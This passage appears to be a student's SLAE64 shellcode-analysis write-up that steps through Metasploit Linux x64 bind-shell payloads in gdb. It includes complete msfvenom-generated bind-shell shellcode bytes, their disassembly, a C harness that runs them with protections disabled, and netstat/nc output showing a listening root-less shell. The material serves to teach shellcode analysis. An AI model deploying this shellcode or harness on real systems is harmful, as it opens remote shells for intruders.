[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601083 --> 0x2fbf4852f875050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107d <code+29>:	xchg   rdi,rax
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
=> 0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601083 in code ()
gdb-peda$ 






[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601085 --> 0x622f2fbf4852f875 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60107f <code+31>:	dec    esi
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
=> 0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
                                                              JUMP is NOT taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601085 in code ()
gdb-peda$ 







[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
RIP: 0x601087 --> 0x6e69622f2fbf4852 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601081 <code+33>:	mov    al,0x21
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
=> 0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0016| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0024| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe580 --> 0x0 
0048| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
0056| 0x7fffffffe590 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601087 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x0 
RIP: 0x601088 --> 0x2f6e69622f2fbf48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601083 <code+35>:	syscall 
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
=> 0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
   0x601095 <code+53>:	mov    al,0x3b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x0 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601088 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x68732f6e69622f2f ('//bin/sh')
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe550 --> 0x0 
RIP: 0x601092 --> 0x50f3bb05f5457 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601085 <code+37>:	jne    0x60107f <code+31>
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
=> 0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
   0x601095 <code+53>:	mov    al,0x3b
   0x601097 <code+55>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe550 --> 0x0 
0008| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0024| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0032| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe580 --> 0x0 
0056| 0x7fffffffe588 --> 0x7fffffffe658 --> 0x7fffffffe870 ("/src/src/Assignment 5/shellcode1")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601092 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x68732f6e69622f2f ('//bin/sh')
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe548 ("//bin/sh")
RIP: 0x601093 --> 0x50f3bb05f54 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601087 <code+39>:	push   rdx
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
=> 0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
   0x601095 <code+53>:	mov    al,0x3b
   0x601097 <code+55>:	syscall 
   0x601099 <code+57>:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe548 ("//bin/sh")
0008| 0x7fffffffe550 --> 0x0 
0016| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0032| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0040| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe580 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601093 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x68732f6e69622f2f ('//bin/sh')
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe540 --> 0x7fffffffe548 ("//bin/sh")
RIP: 0x601094 --> 0x50f3bb05f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601088 <code+40>:	movabs rdi,0x68732f6e69622f2f
   0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
=> 0x601094 <code+52>:	pop    rdi
   0x601095 <code+53>:	mov    al,0x3b
   0x601097 <code+55>:	syscall 
   0x601099 <code+57>:	add    BYTE PTR [rax],al
   0x60109b:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe540 --> 0x7fffffffe548 ("//bin/sh")
0008| 0x7fffffffe548 ("//bin/sh")
0016| 0x7fffffffe550 --> 0x0 
0024| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0032| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0040| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0048| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601094 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffe548 ("//bin/sh")
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe548 ("//bin/sh")
RIP: 0x601095 --> 0x50f3bb0 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601092 <code+50>:	push   rdi
   0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
=> 0x601095 <code+53>:	mov    al,0x3b
   0x601097 <code+55>:	syscall 
   0x601099 <code+57>:	add    BYTE PTR [rax],al
   0x60109b:	add    BYTE PTR [rax],al
   0x60109d:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe548 ("//bin/sh")
0008| 0x7fffffffe550 --> 0x0 
0016| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0032| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0040| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe580 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601095 in code ()
gdb-peda$ 








[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x0 
RCX: 0x601085 --> 0x622f2fbf4852f875 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffe548 ("//bin/sh")
RBP: 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe548 ("//bin/sh")
RIP: 0x601097 --> 0x50f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe650 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601093 <code+51>:	push   rsp
   0x601094 <code+52>:	pop    rdi
   0x601095 <code+53>:	mov    al,0x3b
=> 0x601097 <code+55>:	syscall 
   0x601099 <code+57>:	add    BYTE PTR [rax],al
   0x60109b:	add    BYTE PTR [rax],al
   0x60109d:	add    BYTE PTR [rax],al
   0x60109f:	add    BYTE PTR [rax],al
Guessed arguments:
arg[0]: 0x7fffffffe548 ("//bin/sh")
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe548 ("//bin/sh")
0008| 0x7fffffffe550 --> 0x0 
0016| 0x7fffffffe558 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe560 --> 0x7fffffffe650 --> 0x1 
0032| 0x7fffffffe568 --> 0x601060 --> 0xc6ffe6f748f63148 
0040| 0x7fffffffe570 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe578 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe580 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601097 in code ()
gdb-peda$ 
process 5202 is executing new program: /bin/dash
```

From the debug it's possible to evince that the shellcode behave as expected, executing a shell and binding to a random port
```
$ netstat -tunap
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:48777           0.0.0.0:*               LISTEN      5158/shellcode1 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
$ nc -vv localhost 48777
Connection to localhost 48777 port [tcp/*] succeeded!
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

## Shellcode 2 Analysis

Shellcode Options:

```
root@kali:~# msfvenom -p linux/x64/shell_bind_tcp --arch x64 --payload-options
Options for payload/linux/x64/shell_bind_tcp:


       Name: Linux Command Shell, Bind TCP Inline
     Module: payload/linux/x64/shell_bind_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 86
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LPORT  4444             yes       The listen port
RHOST                   no        The target address

Description:
  Listen for a connection and spawn a command shell


Advanced options for payload/linux/x64/shell_bind_tcp:

    Name                        Current Setting  Required  Description
    ----                        ---------------  --------  -----------
    AppendExit                  false            no        Append a stub that executes the exit(0) system call
    AutoRunScript                                no        A script to run automatically on session creation.
    CommandShellCleanupCommand                   no        A command to run before the session is closed
    InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
    PrependChrootBreak          false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
    PrependFork                 false            no        Prepend a stub that executes: if (fork()) { exit(0); }
    PrependSetgid               false            no        Prepend a stub that executes the setgid(0) system call
    PrependSetregid             false            no        Prepend a stub that executes the setregid(0, 0) system call
    PrependSetresgid            false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
    PrependSetresuid            false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
    PrependSetreuid             false            no        Prepend a stub that executes the setreuid(0, 0) system call
    PrependSetuid               false            no        Prepend a stub that executes the setuid(0) system call
    VERBOSE                     false            no        Enable detailed status messages
    WORKSPACE                                    no        Specify the workspace for this module
Evasion options for payload/linux/x64/shell_bind_tcp:

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
root@kali:~# 
```

Shellcode generation:

```
root@kali:~# msfvenom -p linux/x64/shell_bind_tcp --arch x64 --platform linux -f c
No encoder or badchars specified, outputting raw payload
Payload size: 86 bytes
Final size of c file: 386 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
```

Shellcode opcodes:

```
root@kali:~# echo -ne "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"| ndisasm -u -
00000000  6A29              push byte +0x29
00000002  58                pop eax
00000003  99                cdq
00000004  6A02              push byte +0x2
00000006  5F                pop edi
00000007  6A01              push byte +0x1
00000009  5E                pop esi
0000000A  0F05              syscall
0000000C  48                dec eax
0000000D  97                xchg eax,edi
0000000E  52                push edx
0000000F  C704240200115C    mov dword [esp],0x5c110002
00000016  48                dec eax
00000017  89E6              mov esi,esp
00000019  6A10              push byte +0x10
0000001B  5A                pop edx
0000001C  6A31              push byte +0x31
0000001E  58                pop eax
0000001F  0F05              syscall
00000021  6A32              push byte +0x32
00000023  58                pop eax
00000024  0F05              syscall
00000026  48                dec eax
00000027  31F6              xor esi,esi
00000029  6A2B              push byte +0x2b
0000002B  58                pop eax
0000002C  0F05              syscall
0000002E  48                dec eax
0000002F  97                xchg eax,edi
00000030  6A03              push byte +0x3
00000032  5E                pop esi
00000033  48                dec eax
00000034  FFCE              dec esi
00000036  6A21              push byte +0x21
00000038  58                pop eax
00000039  0F05              syscall
0000003B  75F6              jnz 0x33
0000003D  6A3B              push byte +0x3b
0000003F  58                pop eax
00000040  99                cdq
00000041  48                dec eax
00000042  BB2F62696E        mov ebx,0x6e69622f
00000047  2F                das
00000048  7368              jnc 0xb2
0000004A  005348            add [ebx+0x48],dl
0000004D  89E7              mov edi,esp
0000004F  52                push edx
00000050  57                push edi
00000051  48                dec eax
00000052  89E6              mov esi,esp
00000054  0F05              syscall
```

Let's create a skeleton program:

```
// Filename: shellcode2.c
// Author:  SLAE64 - 1525
//
// Shellcode: msfvenom -p linux/x64/shell_bind_tcp --arch x64 --platform linux -f c

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
void main()
{
    printf("Shellcode Length: %d\n", (int) strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
```

And compile it:

```
$ gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode2
```

Full GDB dump with comments:

```
$ gdb -q ./shellcode2
Reading symbols from ./shellcode2...(no debugging symbols found)...done.
gdb-peda$ break *0x000000000040059a
Breakpoint 1 at 0x40059a
gdb-peda$ r
Starting program: /src/src/Assignment 5/shellcode2 
Shellcode Length:  19



















































[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x6a5f026a9958296a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
RIP: 0x40059a (<main+52>:	call   rdx)
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400589 <main+35>:	mov    QWORD PTR [rbp-0x8],0x601060
   0x400591 <main+43>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x400595 <main+47>:	mov    eax,0x0
=> 0x40059a <main+52>:	call   rdx
   0x40059c <main+54>:	nop
   0x40059d <main+55>:	leave  
   0x40059e <main+56>:	ret    
   0x40059f:	nop
No argument
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0008| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0016| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0032| 0x7fffffffe4c0 --> 0x0 
0040| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0048| 0x7fffffffe4d0 --> 0x100000000 
0056| 0x7fffffffe4d8 --> 0x400566 (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040059a in main ()
gdb-peda$ s















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x6a5f026a9958296a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601060 --> 0x6a5f026a9958296a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105a:	add    BYTE PTR [rax],al
   0x60105c:	add    BYTE PTR [rax],al
   0x60105e:	add    BYTE PTR [rax],al
=> 0x601060 <code>:	push   0x29
   0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0008| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0016| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0024| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0040| 0x7fffffffe4c0 --> 0x0 
0048| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
0056| 0x7fffffffe4d0 --> 0x100000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601060 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x6a5f026a9958296a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x29 (')')
RIP: 0x601062 --> 0x5e016a5f026a9958 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105b:	add    BYTE PTR [rax],al
   0x60105d:	add    BYTE PTR [rax],al
   0x60105f:	add    BYTE PTR [rdx+0x29],ch
=> 0x601062 <code+2>:	pop    rax
   0x601063 <code+3>:	cdq    
   0x601064 <code+4>:	push   0x2
   0x601066 <code+6>:	pop    rdi
   0x601067 <code+7>:	push   0x1
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x29 (')')
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601062 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x29 (')')
RBX: 0x0 
RCX: 0x7fffffea 
RDX: 0x601060 --> 0x6a5f026a9958296a 
RSI: 0x1 
RDI: 0x1 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
RIP: 0x601063 --> 0xf5e016a5f026a99 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x246 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60105d:	add    BYTE PTR [rax],al
   0x60105f:	add    BYTE PTR [rdx+0x29],ch
   0x601062 <code+2>:	pop    rax
=> 0x601063 <code+3>:	cdq    
